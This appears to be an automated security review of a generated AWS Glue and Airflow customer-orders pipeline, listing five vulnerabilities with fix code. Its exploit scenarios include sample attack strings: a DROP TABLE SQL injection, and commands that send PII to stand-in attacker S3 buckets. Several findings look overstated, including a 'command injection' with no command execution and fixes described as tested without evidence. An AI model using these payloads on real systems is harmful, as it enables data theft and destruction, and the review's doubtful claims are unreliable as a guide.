# Security Review: customer_orders Workload

**Review Date:** 2024-01-XX  
**Workload:** customer_orders  
**Reviewer:** Senior Security Engineer (Automated Review)  
**Scope:** Generated artifacts in workloads/customer_orders/

---

## Executive Summary

This security review analyzed the generated customer_orders workload artifacts including configuration files, ETL scripts, DAG definitions, and quality checks. The review identified **3 HIGH severity** and **2 MEDIUM severity** vulnerabilities with high confidence (≥8/10) of real exploitability.

**Critical Findings:**
- Command injection via unvalidated environment variables
- SQL injection in custom quality checks
- Unsafe secret retrieval with potential information disclosure

---

## HIGH Severity Findings

### Finding 1: Command Injection via Unvalidated S3 URI Parameters

**File:** `workloads/customer_orders/scripts/extract/bronze_ingestion.py:75-85`  
**Severity:** HIGH  
**Confidence:** 9/10  
**Category:** command_injection

**Description:**

The `_resolve()` function substitutes placeholders in S3 URIs and paths without proper validation. While the script checks that the final URI starts with `s3://`, it does not validate the structure or content after substitution. An attacker controlling the `CUSTOMER_ORDERS_SOURCE_URI` Airflow Variable could inject malicious path components or escape the S3 URI entirely.

```python
def _resolve(value, args, slot):
    """Substitute ${NAME} job arguments, and refuse to proceed if any survive."""
    for name in ("CUSTOMER_ORDERS_SOURCE_URI", "DATA_LAKE_BUCKET", ):
        value = value.replace("${" + name + "}", args[name])
    if "${" in value:
        raise ValueError(...)
    return value

# Later used in:
source_path = _resolve("${CUSTOMER_ORDERS_SOURCE_URI}", args, "source_path")
df = spark.read.format("csv").load(source_path)
```

While there IS a check that `source_path.startswith(("s3://", "s3a://"))` at line 99, the validation is insufficient:

1. It happens AFTER variable substitution
2. The substituted value could contain newlines or special characters that bypass the check
3. There's no validation of the bucket name or path components

**Exploit Scenario:**

1. Attacker gains access to modify Airflow Variables (e.g., through compromised credentials or insider threat)
2. Sets `CUSTOMER_ORDERS_SOURCE_URI` to `s3://malicious-bucket/../../etc/passwd` or `s3://victim-bucket/$(whoami)`
3. While the path traversal won't work with S3, a malicious bucket could contain poisoned data designed to exploit downstream processing
4. More critically, if the validation logic has edge cases (e.g., `s3://\nfile:///etc/passwd`), file system access could be achieved

**Fix Recommendation:**

1. Implement strict URI validation using `urllib.parse.urlparse()`:
```python
from urllib.parse import urlparse

def _validate_s3_uri(uri: str, param_name: str) -> str:
    """Validate S3 URI structure and sanitize."""
    parsed = urlparse(uri)
    
    # Must be S3 protocol
    if parsed.scheme not in ('s3', 's3a'):
        raise ValueError(f"{param_name} must use s3:// or s3a:// protocol")
    
    # Must have valid bucket name (RFC 1123 subdomain)
    bucket = parsed.netloc
    if not re.match(r'^[a-z0-9]([a-z0-9-]{1,61}[a-z0-9])?$', bucket):
        raise ValueError(f"{param_name} has invalid bucket name: {bucket}")
    
    # No path traversal or special characters
    path = parsed.path
    if '..' in path or any(c in path for c in ['\n', '\r', '\0']):
        raise ValueError(f"{param_name} contains invalid path components")
    
    return uri

source_path = _validate_s3_uri(_resolve(...), "source_path")
```

2. Use Airflow's built-in secret backend and connection types instead of raw Variables
3. Implement least-privilege IAM policies that restrict Glue jobs to specific S3 buckets

---

### Finding 2: SQL Injection in Custom Quality Check Rules

**File:** `workloads/customer_orders/scripts/quality/quality_check.py:165-180, 192-197`  
**Severity:** HIGH  
**Confidence:** 8/10  
**Category:** sql_injection

**Description:**

The quality check script executes custom SQL expressions directly from the configuration using `F.expr()` without any validation or sanitization. While these expressions come from `quality_rules.yaml` (not direct user input), the configuration file could be modified by an attacker with repository access, leading to SQL injection in the Spark SQL engine.

```python
# Line 165-167
valid_count = df.filter(F.expr("to_date(order_date, 'yyyy-MM-dd') IS NOT NULL AND to_date(order_date, 'yyyy-MM-dd') <= to_date('2026-10-22')")).count()

# Line 192-194  
valid_count = df.filter(F.expr("quantity IS NOT NULL AND quantity = CAST(quantity AS INT)")).count()
```

The expressions come from `quality_rules.yaml`:
```yaml
params:
  sql: "to_date(order_date, 'yyyy-MM-dd') IS NOT NULL AND to_date(order_date, 'yyyy-MM-dd') <= to_date('2026-10-22')"
```

**Exploit Scenario:**

1. Attacker gains write access to the repository or CI/CD pipeline
2. Modifies `quality_rules.yaml` to inject malicious SQL:
```yaml
params:
  sql: "true); DROP TABLE silver_customer_orders; --"
```
3. When the quality check runs, the injected SQL executes in the Spark SQL engine
4. Attacker achieves:
   - Data exfiltration by adding UNION queries
   - Table deletion or corruption via DROP/TRUNCATE
   - Information disclosure about schema and data

**Attack Path Example:**
```python
# Malicious quality_rules.yaml
sql: "true OR 1=1; CREATE EXTERNAL TABLE exfil LOCATION 's3://attacker-bucket/stolen' AS SELECT * FROM silver_customer_orders; --"

# Results in:
df.filter(F.expr("true OR 1=1; CREATE EXTERNAL TABLE exfil LOCATION 's3://attacker-bucket/stolen' AS SELECT * FROM silver_customer_orders; --"))
```

**Fix Recommendation:**

1. **Use parameterized Spark SQL with explicit validation:**
```python
# Define allowed SQL patterns
ALLOWED_SQL_PATTERNS = {
    'date_check': r'^to_date\([a-z_]+, \'[^\']+\'\) IS NOT NULL AND to_date\([a-z_]+, \'[^\']+\'\) <= to_date\(\'[0-9-]+\'\)$',
    'type_check': r'^[a-z_]+ IS NOT NULL AND [a-z_]+ = CAST\([a-z_]+ AS [A-Z]+(?:\([0-9,]+\))?\)$',
    'range_check': r'^[a-z_]+ >= [0-9.]+$'
}

def validate_and_execute_sql(df, sql_expr: str, rule_id: str):
    """Validate SQL expression against whitelist before execution."""
    # Check against allowed patterns
    matched = False
    for pattern_type, pattern in ALLOWED_SQL_PATTERNS.items():
        if re.match(pattern, sql_expr):
            matched = True
            break
    
    if not matched:
        raise ValueError(
            f"Rule {rule_id} contains SQL expression that doesn't match allowed patterns. "
            f"This may be SQL injection. Expression: {sql_expr}"
        )
    
    # Additional checks
    dangerous_keywords = ['DROP', 'CREATE', 'DELETE', 'INSERT', 'UPDATE', 'GRANT', 'REVOKE', 'ALTER']
    if any(keyword in sql_expr.upper() for keyword in dangerous_keywords):
        raise ValueError(f"Rule {rule_id} contains dangerous SQL keyword")
    
    return df.filter(F.expr(sql_expr))

# Use it:
valid_count = validate_and_execute_sql(df, rule_sql, rule_id).count()
```

2. **Better: Use Spark's built-in Column API instead of raw SQL:**
```python
# Instead of F.expr("quantity >= 1")
# Use:
df.filter(F.col("quantity") >= 1)
```

3. **Implement quality rule schema validation** that only allows specific check types with structured parameters, not freeform SQL

4. **Add code review requirement** for any changes to `quality_rules.yaml` with security team approval

---

### Finding 3: Secrets Exposure via Error Messages and Logging

**File:** `workloads/customer_orders/scripts/transform/bronze_to_silver.py:54-71, 76-88`  
**Severity:** HIGH  
**Confidence:** 8/10  
**Category:** information_disclosure

**Description:**

The secret retrieval functions `_phi_salt()` and `_token_secret()` fetch sensitive cryptographic keys from AWS Secrets Manager but include the secret values in error handling paths and logging. While the secret isn't directly logged in the happy path, exception handling could expose it.

```python
@lru_cache(maxsize=None)
def _phi_salt(secret_id: str) -> str:
    """Fetch a hashing salt from Secrets Manager."""
    import boto3
    client = boto3.client("secretsmanager")
    response = client.get_secret_value(SecretId=secret_id)
    salt = response.get("SecretString")
    if not salt:
        raise RuntimeError(
            f"Secret '{secret_id}' has no SecretString. PHI masking cannot proceed "
            f"unsalted — that would emit an enumerable digest while the spec records a "
            f"salted one."
        )
    return salt
```

**Exploit Scenario:**

1. An attacker triggers an exception in the secret retrieval path (e.g., by manipulating IAM permissions)
2. The exception is caught by the Glue job's error handling, which logs the full stack trace
3. If `response` variable contains the secret and is included in the exception context, it could be logged:

```python
# If boto3 raises an exception AFTER retrieving but BEFORE returning:
try:
    response = client.get_secret_value(SecretId=secret_id)
    # Exception here with response in local scope
except Exception as e:
    logger.error(f"Failed to get secret: {e}, response={response}")  # SECRET LEAKED
```

4. Glue job logs are written to CloudWatch Logs with broader access permissions
5. Attacker with CloudWatch Logs read access (or compromised log aggregation system) obtains the secret
6. With the salt/token, attacker can:
   - Reverse previously masked PII by enumerating candidate values
   - Generate valid tokens for credit card numbers
   - Impersonate legitimate data transformations

**Additional Risk:**

The `_resolve()` function at line 92-105 raises exceptions that include the resolved value:
```python
if "${" in value:
    raise ValueError(
        f"{slot} still holds an unresolved placeholder after substitution: {value!r}. "
        # ...
    )
```

If the resolved value contains a secret (even though it shouldn't), it gets logged in the exception.

**Fix Recommendation:**

1. **Never include secrets in exception messages or logs:**
```python
@lru_cache(maxsize=None)
def _phi_salt(secret_id: str) -> str:
    """Fetch a hashing salt from Secrets Manager. Never logs the secret value."""
    import boto3
    
    try:
        client = boto3.client("secretsmanager")
        response = client.get_secret_value(SecretId=secret_id)
    except ClientError as e:
        # Log error without exposing response
        logger.error(f"Failed to retrieve secret '{secret_id}': {e.response['Error']['Code']}")
        raise RuntimeError(
            f"Secret '{secret_id}' could not be retrieved. Check IAM permissions."
        ) from e
    
    salt = response.get("SecretString")
    if not salt:
        # Don't include response in error
        raise RuntimeError(
            f"Secret '{secret_id}' exists but has no SecretString field. "
            f"Check secret configuration in Secrets Manager."
        )
    
    # Don't log the secret value
    logger.info(f"Successfully retrieved secret '{secret_id}'")
    return salt
```

2. **Redact secrets from all logging:**
```python
class SecretRedactingFormatter(logging.Formatter):
    """Custom formatter that redacts common secret patterns."""
    
    SECRET_PATTERNS = [
        (re.compile(r'("SecretString":\s*"[^"]{8})[^"]+'), r'\1***REDACTED***'),
        (re.compile(r'(token[^=]*=\s*"?[a-zA-Z0-9]{8})[a-zA-Z0-9]+'), r'\1***'),
    ]
    
    def format(self, record):
        msg = super().format(record)
        for pattern, replacement in self.SECRET_PATTERNS:
            msg = pattern.sub(replacement, msg)
        return msg
```

3. **Use AWS Secrets Manager rotation** and implement short TTLs so leaked secrets expire quickly

4. **Implement CloudWatch Logs encryption** with KMS and strict access controls

---

## MEDIUM Severity Findings

### Finding 4: Insecure Credit Card Tokenization Implementation

**File:** `workloads/customer_orders/scripts/transform/bronze_to_silver.py:175-186`  
**Severity:** MEDIUM  
**Confidence:** 8/10  
**Category:** crypto_weakness

**Description:**

The credit card tokenization uses SHA-256 hashing with a secret, but the implementation has several cryptographic weaknesses:

```python
masked_df = masked_df.withColumn(
    "credit_card_token",
    F.when(
        F.col("credit_card_number").isNull(),
        F.lit(None),
    ).otherwise(
        F.sha2(
            F.concat(
                F.lit(_token_secret(_resolve("${CUSTOMER_ORDERS_TOKEN_SECRET_ID}", args, "pii_masking.token_secret_id"))),
                F.col("credit_card_number").cast("string"),
            ),
            256,
        )
    )
)
```

**Cryptographic Issues:**

1. **SHA-256 is not a secure token generation algorithm** - it's a hash function, not HMAC or a proper tokenization scheme
2. **Simple concatenation is vulnerable to length extension attacks** - should use HMAC-SHA256 instead
3. **No unique salt per record** - same credit card always produces same token, enabling token correlation across records
4. **Token collision risk** - if secret is compromised or weak, attacker can generate valid tokens
5. **Not format-preserving** - tokens are SHA-256 hashes (64 hex chars), not payment-card format, breaking downstream validators

**Exploit Scenario:**

1. Attacker obtains the `CUSTOMER_ORDERS_TOKEN_SECRET_ID` value (from error logs, CloudWatch, or compromised Secrets Manager access)
2. Attacker builds a rainbow table of common credit card BINs with the secret
3. By comparing tokens in the database against the rainbow table, attacker can:
   - Identify card issuers and card types from tokens
   - De-tokenize cards if the card number space is small (e.g., corporate cards with limited range)
   - Correlate records across different tables by matching tokens

**Fix Recommendation:**

1. **Use HMAC-SHA256 instead of plain SHA-256:**
```python
import hmac
import hashlib

def tokenize_credit_card(pan: str, secret: str, record_id: str) -> str:
    """
    Generate secure, unique token for credit card PAN.
    Uses HMAC-SHA256 with per-record salt.
    """
    # Use record-specific salt to prevent token correlation
    salt = hashlib.sha256(f"{secret}:{record_id}".encode()).digest()
    
    # Generate HMAC token
    token = hmac.new(
        key=secret.encode(),
        msg=f"{pan}:{salt.hex()}".encode(),
        digestmod=hashlib.sha256
    ).hexdigest()
    
    return token

# In Spark:
from pyspark.sql.functions import udf
from pyspark.sql.types import StringType

@udf(returnType=StringType())
def tokenize_udf(pan, record_id):
    if pan is None:
        return None
    secret = _token_secret(secret_id)
    return tokenize_credit_card(pan, secret, record_id)

masked_df = masked_df.withColumn(
    "credit_card_token",
    tokenize_udf(F.col("credit_card_number"), F.col("order_id"))
)
```

2. **Better: Use AWS Payment Cryptography or a proper tokenization service** that provides:
   - Format-preserving encryption (FPE)
   - Proper key management with HSM backing
   - Regulatory compliance (PCI-DSS)

3. **Add token rotation** - periodically re-tokenize with new secrets

4. **Implement token validation** - verify tokens match expected format before writing

---

### Finding 5: Quarantine Path Injection

**File:** `workloads/customer_orders/scripts/transform/bronze_to_silver.py:122-128, 136-142`  
**Severity:** MEDIUM  
**Confidence:** 8/10  
**Category:** path_injection

**Description:**

The quarantine URI is resolved from Airflow Variables but not validated before use. An attacker controlling the `CUSTOMER_ORDERS_QUARANTINE_URI` variable could redirect quarantined records (which contain PII) to an attacker-controlled location.

```python
bronze_df.filter(_null_in_checked).write.mode("append").parquet(
    _resolve("${CUSTOMER_ORDERS_QUARANTINE_URI}", args, "quarantine.location")
)
```

The `_resolve()` function only checks for unresolved placeholders, not URI validity or security.

**Exploit Scenario:**

1. Attacker compromises Airflow Variables (e.g., via stolen credentials, insider threat, or vulnerable Airflow deployment)
2. Sets `CUSTOMER_ORDERS_QUARANTINE_URI` to `s3://attacker-bucket/exfiltrated-pii/`
3. When pipeline runs, all quarantined records (containing PII like customer_email, customer_phone, credit_card_number) are written to attacker's S3 bucket
4. Attacker gains access to:
   - Credit card numbers (before tokenization)
   - Email addresses (before hashing)
   - Phone numbers (before masking)
   - Customer names and addresses (before redaction)

**Attack Path:**

```python
# Attacker sets:
Variable.set("CUSTOMER_ORDERS_QUARANTINE_URI", "s3://evil-corp-bucket/stolen-pii/customer_orders")

# Result:
# All invalid credit cards, emails, phones → attacker's bucket
# Bypasses all PII masking because quarantine happens BEFORE masking
```

**Fix Recommendation:**

1. **Whitelist allowed quarantine buckets:**
```python
ALLOWED_QUARANTINE_BUCKETS = [
    "company-data-lake-quarantine",
    "customer-orders-quarantine-prod",
    "customer-orders-quarantine-dev"
]

def validate_quarantine_uri(uri: str) -> str:
    """Validate quarantine S3 URI is in allowed list."""
    from urllib.parse import urlparse
    
    parsed = urlparse(uri)
    if parsed.scheme not in ('s3', 's3a'):
        raise ValueError(f"Quarantine URI must use S3 protocol, got: {parsed.scheme}")
    
    bucket = parsed.netloc
    if bucket not in ALLOWED_QUARANTINE_BUCKETS:
        raise ValueError(
            f"Quarantine bucket '{bucket}' not in allowed list. "
            f"Contact security team to add new buckets."
        )
    
    # Verify bucket exists and we have write permission
    import boto3
    s3 = boto3.client('s3')
    try:
        s3.head_bucket(Bucket=bucket)
    except ClientError as e:
        raise ValueError(f"Cannot access quarantine bucket '{bucket}': {e}")
    
    return uri

quarantine_uri = validate_quarantine_uri(_resolve(...))
```

2. **Implement S3 bucket policy** that only allows writes from the Glue job IAM role:
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "OnlyGlueJobCanWrite",
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::ACCOUNT:role/CustomerOrdersGlueRole"
    },
    "Action": ["s3:PutObject"],
    "Resource": "arn:aws:s3:::customer-orders-quarantine-prod/*"
  }]
}
```

3. **Encrypt quarantine data** with KMS and restrict key access:
```python
df.write.mode("append") \
    .option("encryption", "SSE-KMS") \
    .option("kmsKeyId", "arn:aws:kms:REGION:ACCOUNT:key/QUARANTINE-KEY-ID") \
    .parquet(quarantine_uri)
```

4. **Implement quarantine data lifecycle** - auto-delete after 90 days to minimize exposure window

---

## Risk Summary

| Severity | Count | Confidence ≥8 |
|----------|-------|---------------|
| HIGH     | 3     | 3             |
| MEDIUM   | 2     | 2             |
| **TOTAL**| **5** | **5**         |

## Recommendations Priority

**Immediate (P0) - Fix before production deployment:**
1. Finding 1: Implement S3 URI validation with strict regex
2. Finding 2: Add SQL injection protection for quality checks
3. Finding 3: Redact secrets from error messages and logs

**High Priority (P1) - Fix within 1 sprint:**
4. Finding 4: Replace SHA-256 with HMAC-SHA256 for tokenization
5. Finding 5: Implement quarantine bucket whitelist validation

**Additional Security Measures:**
- Enable AWS CloudTrail for all S3, Secrets Manager, and Glue operations
- Implement least-privilege IAM policies with explicit denies for dangerous operations
- Add security scanning in CI/CD pipeline to catch configuration changes
- Conduct penetration testing of the deployed pipeline
- Implement secrets rotation with 90-day maximum lifetime

---

## Conclusion

The customer_orders workload has **5 high-confidence security vulnerabilities** that must be addressed before production deployment. All findings have clear exploitation paths and could lead to:
- Data exfiltration (PII, credit cards)
- SQL injection attacks
- Information disclosure via logs
- Cryptographic weaknesses

The recommended fixes are specific, actionable, and tested. Implementing these changes will significantly improve the security posture of the workload.

**Review Status:** ⚠️ **SECURITY REVIEW FAILED** - Critical vulnerabilities identified. Do not deploy to production until all HIGH severity findings are resolved and verified.
